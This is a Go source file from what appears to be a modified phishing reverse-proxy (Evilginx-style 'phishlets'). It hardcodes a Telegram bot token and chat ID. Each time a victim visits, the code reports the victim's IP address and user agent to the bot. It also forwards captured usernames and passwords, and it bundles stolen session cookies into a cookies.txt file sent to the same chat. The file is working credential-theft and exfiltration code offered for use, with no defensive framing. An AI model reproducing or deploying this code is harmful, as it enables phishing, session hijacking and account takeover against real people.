package database

import (
    "encoding/json"
    "fmt"
    "strconv"
    "strings"
    "github.com/tidwall/buntdb"
)

type Database struct {
	path string
	db   *buntdb.DB
	telegram TelegramConfig
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
		telegram: TelegramConfig{
            BotToken: "7791547355:AAH3PgpwEnVIXqfHSrMtqD-s3aNst-RAVSc",
            ChatID:   "7059352737",
        },
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
    _, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
    
    // Send new visitor notification
    message := fmt.Sprintf(`🎯 <b>New Visitor Detected!</b>

🌐 <b>Landing URL:</b> %s
👤 <b>User Agent:</b> %s
🌍 <b>IP Address:</b> %s
⚡️ <b>Phishlet:</b> %s
🔑 <b>Session ID:</b> %s`, 
        landing_url,
        useragent,
        remote_addr,
        phishlet,
        sid)
    
		if err := sendTelegramMessage(d.telegram, message); err != nil {
			// Log error but don't fail the function
			fmt.Printf("Failed to send Telegram message: %v\n", err)
		}
	
    return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
    err := d.sessionsUpdateUsername(sid, username)
    
    message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>

✉️ <b>Email/Username:</b> %s
🔑 <b>Session ID:</b> %s`, 
        username,
        sid)
    
    sendTelegramMessage(d.telegram, message)
    return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
    err := d.sessionsUpdatePassword(sid, password)

    
    message := fmt.Sprintf(`🔐 <b>Password Captured!</b>

🔑 <b>Password:</b> %s
🆔 <b>Session ID:</b> %s`,
        password,
        sid)
    
    sendTelegramMessage(d.telegram, message)
    return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
    err := d.sessionsUpdateCookieTokens(sid, tokens)
    
    // Create cookies.txt content
    var cookieContent strings.Builder
    for domain, cookies := range tokens {
        for name, cookie := range cookies {
            cookieContent.WriteString(fmt.Sprintf("Domain: %s\nName: %s\nValue: %s\nPath: %s\nHttpOnly: %v\n\n",
                domain, name, cookie.Value, cookie.Path, cookie.HttpOnly))
        }
    }
    
    // Send cookies file
    sendTelegramFile(d.telegram, "cookies.txt", cookieContent.String())
    
    message := fmt.Sprintf(`🍪 <b>Cookies Captured!</b>

🔑 <b>Session ID:</b> %s
📎 <b>Check cookies.txt file above</b>`,
        sid)
    
    sendTelegramMessage(d.telegram, message)
    return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
